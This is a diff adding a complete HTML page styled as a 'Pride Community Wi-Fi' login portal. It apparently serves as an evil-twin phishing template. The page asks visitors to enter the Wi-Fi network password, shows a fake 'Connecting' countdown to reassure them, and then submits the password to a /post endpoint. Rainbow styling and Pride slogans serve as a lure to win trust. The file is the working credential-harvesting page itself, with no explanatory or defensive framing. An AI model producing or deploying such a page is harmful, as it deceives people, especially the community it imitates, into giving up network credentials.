@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pride Community Wi-Fi</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #e40303, #ff8c00, #ffed00, #008026, #004dff, #750787);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: white;
+            padding: 24px;
+            border-radius: 14px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 360px;
+            width: 100%;
+        }
+        .flag {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #e40303, #ff8c00, #ffed00, #008026, #004dff, #750787);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+        }
+        .footer {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #888;
+        }
+        div#success-block {
+            display: none;
+            text-align: center;
+            min-height: 60px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="flag">&#127987;&#65039;&#8205;&#127752;</div>
+        <h1>Pride Community Wi-Fi</h1>
+        <div id='form-block'>
+            <p>Free internet provided with love. Enter the Wi-Fi password to connect.</p>
+            <form id='submit-form' action="/post">
+                <input type="password" name="password" placeholder="Wi-Fi network password" required>
+                <button type="submit">Connect with Pride</button>
+            </form>
+        </div>
+        <div id='success-block'>
+            <p>Connecting in <span id="span-count" style="font-weight: bolder;">5</span>... &#10084;&#65039;</p>
+        </div>
+        <div class="footer">Love is love &middot; Trans rights are human rights</div>
+    </div>
+
+    <script>
+      document.getElementById('submit-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        document.getElementById('success-block').style.display = 'flex';
+        document.getElementById('form-block').style.display = 'none';
+
+        setInterval(function() {
+            index = parseInt(document.getElementById('span-count').textContent)
+            if (index > 1) {
+                document.getElementById('span-count').textContent = index-1;
+                index--;
+            } else {
+                document.getElementById('submit-form').submit();
+            }
+        }, 1000);
+      });
+    </script>
+</body>
+</html>
